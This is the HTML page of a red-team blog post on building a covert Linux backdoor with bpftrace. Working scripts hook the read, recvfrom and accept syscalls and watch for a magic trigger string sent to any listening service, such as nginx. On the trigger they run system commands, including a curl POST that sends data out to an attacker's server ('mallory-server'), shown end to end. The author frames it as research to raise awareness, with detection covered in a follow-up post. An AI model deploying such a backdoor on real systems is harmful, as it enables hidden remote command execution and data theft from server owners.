@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" Offensive BPF: Using bpftrace to host backdoors &middot;  Embrace The Red" />
+  
+  <meta property="og:site_name" content="Embrace The Red" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2021-10-06T20:00:13-07:00" />
+  
+  <meta property="og:article:tag" content="pentest" />
+  
+  <meta property="og:article:tag" content="red" />
+  
+  <meta property="og:article:tag" content="research" />
+  
+  <meta property="og:article:tag" content="ebpf" />
+  
+  <meta property="og:article:tag" content="blue" />
+  
+  
+
+  <title>
+     Offensive BPF: Using bpftrace to host backdoors &middot;  Embrace The Red
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
+  
+
+  
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@wunderwuzzi23">
+<meta name="twitter:title" content="Offensive BPF: Using bpftrace to host backdoors">
+<meta name="twitter:description" content="Using eBPF in offensive security settings and mitigations">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2021/obpf.png">
+
+<meta name="twitter:creator" content="@wunderwuzzi23">
+
+
+
+
+
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        wunderwuzzi&#39;s blog
+        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">Offensive BPF: Using bpftrace to host backdoors</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2021-10-06T20:00:13-07:00">
+          Oct 6, 2021
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/pentest">#pentest</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/research">#research</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ebpf">#ebpf</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/blue">#blue</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p>This post is part of a series about <strong>Offensive BPF</strong> that I&rsquo;m working on to learn how BPFs use will impact offensive security, malware and detection engineering. Click the <a href="/blog/tags/ebpf">&ldquo;ebpf&rdquo;</a> tag to see all relevant posts.</p>
+<p><img src="/blog/images/2021/offensive-bpf.png" alt="Offensive BPF"></p>
+<p>In the last post we talked about a basic bpftrace script to install a BPF program that runs commands upon connecting from a specific IP with a specific magic source port.</p>
+<p>This post will dive into this idea more by leveraging more a complex solution.</p>
+<h1 id="building-a-message-based-trigger">Building a message-based trigger</h1>
+<p>What I really wanted instead of using the source port to trigger the execution of a payload was to use a &ldquo;secret backdoor message&rdquo; which <strong>could arrive on <em>any</em> port to any listening service</strong>.</p>
+<p>The below screenshot shows the BPF program running, and someone connected to <code>nginx</code> and sending in <code>commands</code> instead of valid HTTP requests.</p>
+<p><img src="/blog/images/2021/obpf-command-server.png" alt="obpf"></p>
+<p>How did I get there? Let&rsquo;s get started.</p>
+<h2 id="finding-trace-points-of-interest">Finding trace points of interest</h2>
+<p>Searching through hook points with <code>bpftrace -lv</code> identified useful seeming trace points:</p>
+<pre><code>$ sudo bpftrace -lv 'tracepoint:*enter_read' 
+BTF: using data from /sys/kernel/btf/vmlinux
+tracepoint:syscalls:sys_enter_read
+    int __syscall_nr;
+    unsigned int fd;
+    char * buf;
+    size_t count;
+</code></pre><p>About the command line options:</p>
+<ul>
+<li><code>-l</code>:  lists all the tracepoints, kprobes, uprobes that match provided string</li>
+<li><code>*</code>: Awesome: You can also use <code>*</code> as wildcards in the search</li>
+<li><code>-v</code>: shows data structures details (very useful). This didn&rsquo;t work before upgrading to a very recent Ubuntu version</li>
+</ul>
+<p>I wanted to read and print the <code>char * buf</code>.</p>
+<p>While coding and debugging I realized that <code>sys_enter_read</code> is called BUT the buffer <code>buf</code> is not yet filled with data - so how to access the data?</p>
+<h2 id="grasping-enter-and-exit-tracing-to-read-buffers">Grasping &ldquo;Enter&rdquo; and &ldquo;Exit&rdquo; tracing to read buffers</h2>
+<p>It took me a bit to grasp how enter and exit trace points work in unison to achieve the desired result.</p>
+<p>In retrospect its obvious, but for anyone learning this, here is an explanation:</p>
+<p>Exit trace points (e.g. <code>sys_exit_read</code>) don&rsquo;t have access to the arguments passed into the function.</p>
+<p><strong>This is solved by storing a pointer in a BPF map when inside <code>sys_enter_read</code> and then reading and using that pointer in <code>sys_exit_read</code>.</strong></p>
+<p>This works as in the exit hook the buffer (in this case <code>buf</code>) is filled with the data. And the <code>sys_exit_*</code> functions have a <code>ret</code> value that holds about the length of the buffer to read.</p>
+<p>After figuring that out, everything fell into place, and I made quick progress.</p>
+<p>Here is what this means in <code>bpftrace</code> code:</p>
+<pre><code>tracepoint:syscalls:sys_enter_read
+{ 
+    @sys_read[tid] = args-&gt;buf;
+}
+</code></pre><p>This stores the <code>buf</code> pointer in <code>@variable[tid]</code> - thread local so to speak. I named the variable <code>@sys_read</code>.</p>
+<p>Then in <code>sys_exit_read</code> the pointer is extracted, and we read the buffer as string.</p>
+<pre><code>tracepoint:syscalls:sys_exit_read
+/ @sys_read[tid] /   
+{ 
+  $cmd = str(@sys_read[tid], args-&gt;ret);
+  printf(&quot;&lt;-sys_exit_read: $cmd);
+
+  if ($cmd == &quot;OhhhBPF!\n&quot;)
+  {   
+    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
+  }
+
+  printf(&quot;&lt;-sys_exit_read(tdi:%d).\n&quot;, tid);
+}
+</code></pre><p>Now the <code>$cmd</code> contains the string. You can also use <code>buf(@sys_read[tid, args-&gt;ret)</code> to read the hex representation and to print hex with bpftrace&rsquo;s <code>printf</code> use the <code>\r</code> option.</p>
+<p>Finally, string comparison such as <code>if ($cmd == &quot;OhhhBPF!\n&quot;)</code> can be used to make decisions based on messages that arrive.</p>
+<h3 id="applying-a-filter">Applying a Filter</h3>
+<p>A new concept in the above example was the use of a <code>filter</code> via  <code>/ @sys_read[tid] /</code>. This filters only calls that are relevant.</p>
+<p>If you want to filter by a certain process name specify it like: <code>/ comm=&quot;nc&quot; /</code></p>
+<p>That&rsquo;s it. At this point the program works as intended!</p>
+<h2 id="improvements-tracing-only-relevant-reads">Improvements: Tracing only relevant reads</h2>
+<p>At that point reading buffers worked. But, it is too noisy because all <code>reads()</code> are traced - even though only socket connections are of interest.</p>
+<p>There is probably many better ways to do this (I&rsquo;m learning), but with the newly acquired <code>bcptrace</code> chops, I thought to:</p>
+<ul>
+<li>Hook the socket <code>accept</code> call via the <code>syscalls:sys_enter_accept*</code> trace points. I learned to trace <code>accept4</code> by observing the systems calls of a <code>netcat</code> server, by running: <code>strace nc -lkv 20000</code>. But other programs only trigger <code>accept</code> - so I&rsquo;m catching both.</li>
+<li>Add an IP address check to allow only a specific IP to cause the trigger - we did this in last post so skipping in this post</li>
+<li>Use filter <code>@sys_accepted[tid]</code> on <code>sys_enter_read</code> to only enter if there was an <code>accept</code> earlier</li>
+</ul>
+<p>This the resulting code:</p>
+<pre><code>#include &lt;net/sock.h&gt;
+
+BEGIN
+{
+  printf(&quot;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&quot;);
+}
+
+tracepoint:syscalls:sys_enter_accept*
+{ 
+  @sk[tid] = args-&gt;upeer_sockaddr;
+}
+
+tracepoint:syscalls:sys_exit_accept*
+/ @sk[tid] /
+{
+  @sys_accepted[tid] = @sk[tid]; 
+}
+
+tracepoint:syscalls:sys_enter_read
+/ @sys_accepted[tid] /
+{   
+  printf(&quot;-&gt;sys_enter_read for allowed thread (fd: %d)\n&quot;, args-&gt;fd);
+  @sys_read[tid] = args-&gt;buf;
+}
+
+tracepoint:syscalls:sys_exit_read
+{
+  if (@sys_read[tid] != 0)
+  { 
+    $len = args-&gt;ret;
+    $cmd = str(@sys_read[tid], $len);
+    printf(&quot;*** Command: %s\n&quot;, $cmd);
+  } 
+}
+
+END
+{
+    clear(@sk);
+    clear(@sys_read);
+    clear(@sys_accepted);
+    printf(&quot;Exiting. Bye.\n&quot;);
+}
+</code></pre><p>After these changes the program works, and without noise.</p>
+<h2 id="system-command">Command parsing and simulating data exfiltration</h2>
+<p>To add command processing via a trigger word was the final feature I wanted to see if it can be implemented via <code>bpftrace</code>.</p>
+<p>The trigger word the code looks for is &ldquo;OhhhBPF: &ldquo;. If it is encountered it will invoke certain internal features, like run commands or call a web server. For the later part there is a command line argument being introduced <code>$1</code>, which is the destination web server for the <code>curl</code> post which the <code>!exfil</code> command uses.</p>
+<pre><code>tracepoint:syscalls:sys_exit_read
+{
+  $len = args-&gt;ret;
+
+  if ((@sys_read[tid] != 0) &amp;&amp; ($len &gt; 9))
+  { 
+    //lot's of assumption, but should work for line based protocols
+    $cmd = str(@sys_read[tid], 9);
+    if ($cmd == &quot;OhhhBPF: &quot;)
+    {
+      $cmd = str(@sys_read[tid]+9, $len-9-1);
+      printf(&quot;*** Command: %s\n&quot;, $cmd);
+
+      if ($cmd == &quot;!exfil&quot;)
+      {   
+        printf(&quot;Command:exfil\n&quot;);
+        system(&quot;echo POC &gt; /proc/1/root/tmp/o&quot;);
+        system(&quot;curl -X POST --data-binary @/proc/1/root/tmp/o %s&quot;, str($1));
+        system(&quot;rm -f /proc/1/root/tmp/o&quot;);
+      }
+      else
+      {
+       // do other stuff
+      }
+    }
+  } 
+}
+</code></pre><p><strong>Important:</strong> This doesn&rsquo;t encrypt incoming traffic and also has no IP filter (like we had in <a href="/blog/posts/2021/offensive-bpf-bpftrace">the previous post</a>) nor authentication or does malcious stuff - it&rsquo;s for demonstration purposes and learning to raise awareness of these kinds of attacks.</p>
+<p>This works well with <code>nc</code> and a set of other services, but unfortunately the trigger mechanism didn&rsquo;t work with <code>nginx</code> or <code>OpenSSH server</code>.</p>
+<h2 id="getting-it-to-work-with-nginx">Getting it to work with nginx!</h2>
+<p>To debug this for <code>nginx</code>, I ran <code>strace -p</code> to see which syscalls <code>nginx</code> performs when reading the data from the wire.</p>
+<pre><code>$ sudo strace -p 70501
+strace: Process 70501 attached
+epoll_wait(11, [{events=EPOLLIN, data={u32=3680256016, u64=139710376460304}}], 512, -1) = 1
+accept4(6, {sa_family=AF_INET, sin_port=htons(37194), sin_addr=inet_addr(&quot;10.0.0.2&quot;)}, [112-&gt;16], SOCK_NONBLOCK) = 8
+epoll_ctl(11, EPOLL_CTL_ADD, 8, {events=EPOLLIN|EPOLLRDHUP|EPOLLET, data={u32=3680256713, u64=139710376461001}}) = 0
+epoll_wait(11, GET[{events=EPOLLIN, data={u32=3680256713, u64=139710376461001}}], 512, 60000) = 1
+recvfrom(8, &quot;GET / HTTP/1.0\n&quot;, 1024, 0, NULL, NULL) = 15
+</code></pre><p>Turns out nginx uses <code>recvfrom</code>!</p>
+<p>So, the next step was to look for <code>recvfrom</code> trace points.</p>
+<p>To figure that out, I used our friend <code>bpftrace</code> again with the <code>-lv</code> options:</p>
+<pre><code>$ sudo bpftrace -lv 'tracepoint:*recvfrom*'
+BTF: using data from /sys/kernel/btf/vmlinux
+tracepoint:syscalls:sys_enter_recvfrom
+    int __syscall_nr;
+    int fd;
+    void * ubuf;
+    size_t size;
+    unsigned int flags;
+    struct sockaddr * addr;
+    int * addr_len;
+tracepoint:syscalls:sys_exit_recvfrom
+    int __syscall_nr;
+    long ret;
+</code></pre><p>Excellent!</p>
+<p>Next step was to implement hook points for these two trace points.</p>
+<p>I did so by following the exact same coding pattern as before with <code>sys_enter_read</code> and <code>sys_exit_read</code> - the only thing I had to change was the name of the buffer variable from <code>buf</code> to <code>ubuf</code>.</p>
+<p>Final result - it works!</p>
+<h2 id="bpf-backdoor-in-action">BPF Backdoor in Action</h2>
+<p>After launching the BPF program on the compromised server an adverary can connect to any exposed (and supported) port, send in the &ldquo;magic string&rdquo; and the malicious BPF program will get involved.</p>
+<p>On a compromised server, Mallory installs the BPF program using <code>bpftrace</code>:
+<img src="/blog/images/2021/obpf-mallory.PNG" alt="obpf"></p>
+<p>The <code>bpftrace</code> script will send data to a server <code>mallory-server:10000</code> when sending <code>OhhhBPF: !exfil</code> as command.</p>
+<p>From her attack machine Mallory now connects to the server and runs <code>OhhhBPF: </code> commands that trigger the BPF program:</p>
+<p><img src="/blog/images/2021/obpf-command.png" alt="obpf"></p>
+<p>The BPF program handles the incomming requests:</p>
+<p><img src="/blog/images/2021/obpf-command-server.png" alt="obpf"></p>
+<p>Voila. Mallory&rsquo;s web server receives the exfiltration requests.</p>
+<p><img src="/blog/images/2021/obpf-exfil.png" alt="obpf"></p>
+<p>This is the BPF proof of concept program working end to end without having to have any low-level kernel coding skills - pretty amazing.</p>
+<p>For OpenSSH I might have to hook the user space. The SSH server only ever reads single bytes via <code>read()</code>, which makes parsing and concatenating bytes or traversing the proper structs a bit cumbersome with <code>bpftrace</code>. Doing user space hooking should be easier and will be part of an upcoming post.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>In this post we looked at more advanced <code>bpftrace</code> usage scenarios that adversaries can leverage and that defenders not to start being aware of.</p>
+<p>In the <a href="/blog/posts/2021/offensive-bpf-detections-initial-ideas/">next post</a> I will summarize detection ideas, and look into BPF monitoring tooling as well.</p>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2018-2021
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
